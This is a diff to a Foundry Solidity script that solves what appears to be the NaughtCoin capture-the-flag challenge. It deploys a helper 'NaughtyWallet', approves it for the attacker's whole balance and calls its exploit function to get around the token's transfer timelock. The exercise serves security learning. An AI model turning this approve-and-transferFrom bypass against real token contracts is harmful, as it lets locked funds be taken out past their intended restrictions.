@@ -4,6 +4,7 @@ pragma solidity >=0.6.0 <0.9.0; // flexible is better, no?
 import "forge-std/Script.sol";
 import "forge-std/console2.sol";
 import "src/NaughtCoin/NaughtCoin.sol";
+import "./NaughtyWallet.sol";
 
 contract NaughtCoinScript is Script {
 
@@ -21,7 +22,7 @@ contract NaughtCoinScript is Script {
             /** Define addresses  (NO NEED TO CHANGE ANYTHING HERE) **/
             attacker = msg.sender;
             /** Setup contract and required init (you may have to modify this section) **/
-            // target = NaughtCoin(0x0000000000000000000000000000000000000000); //attach to an existing contract
+            target = NaughtCoin(0x0000000000000000000000000000000000000000); //attach to an existing contract
         }else{ // local - chainid = 31137
             /** Define actors (NO NEED TO CHANGE ANYTHING HERE) **/
             deployer = vm.addr(1);
@@ -33,7 +34,7 @@ contract NaughtCoinScript is Script {
             vm.deal(attacker, 0.5 ether);
             /** Setup contract and required init (you may have to modify this section) **/
             vm.startBroadcast(deployer);
-            // target = new NaughtCoin();
+            target = new NaughtCoin(attacker);
             vm.stopBroadcast();
         }
     }
@@ -45,5 +46,13 @@ contract NaughtCoinScript is Script {
     function run() public {
         console.log("[Info]");
         console.log("attacker : %s", attacker);
+
+        console.log("[Exploit]");
+        vm.startBroadcast(attacker);
+        NaughtyWallet wallet = new NaughtyWallet();
+        target.approve(address(wallet), target.balanceOf(attacker));
+        wallet.exploit(address(target));
+        vm.stopBroadcast();
+        console.log("NaughtCoin.balanceOf(atacker) : %d wei", target.balanceOf(attacker));
     }
 }
